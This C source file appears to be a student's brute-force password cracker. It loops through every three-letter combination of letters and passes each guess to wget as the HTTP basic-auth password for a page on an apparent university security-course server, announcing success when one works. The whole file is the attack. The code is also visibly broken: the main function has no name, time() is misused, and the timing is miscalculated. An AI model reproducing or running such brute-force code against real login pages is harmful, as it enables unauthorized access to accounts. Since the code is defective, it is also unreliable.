

#include<stdio.h>
#include<stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/time.h>
#include<string.h>
int ()
{
char a[100],c[100],c1[100],c2[100],m[50];
char b[53]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

int i,j,k,count=0;
int  total_time,start_time,end_time;
start_time = time();


for(i=0;i<52;i++)
{
	
	m[0]=b[i];
	m[1]='\0';
	strcpy(c,m);
	printf("%s \n",c);
	for(j=0;j<52;j++)
	{
	m[0]=b[j];
	m[1]='\0';
	strcpy(c1,c);
	strcat(c1,m);
	printf("%s \n",c1);
	for(k=0;k<52;k++)
	{
		count++;
		printf("ATTEMPT :%d\n",count);
		
		m[0]=b[k];
		m[1]='\0';
		strcpy(c2,c1);
		strcat(c2,m);

strcpy(a,"wget http://sec-crack.cs.rmit.edu./SEC/2/index.php --http-user= --http-passwd=");

		strcat(a,c2);		
		if(system(a)==0)
		{
		printf("Congratulations!!!!BruteForce Attack Successful\n");
		printf("***********************************************\n");
		printf("The Password is %s\n",c2);
		printf("The Request sent is %s\n",a); 
                end_time = time();
                total_time = (end_time -start_time);
                total_time /= 1000000000.0;
                printf("The Time Taken is : %llds\n",total_time);
		exit(1);
		}
		
		
		
		
	}

}
}
return 0;
}
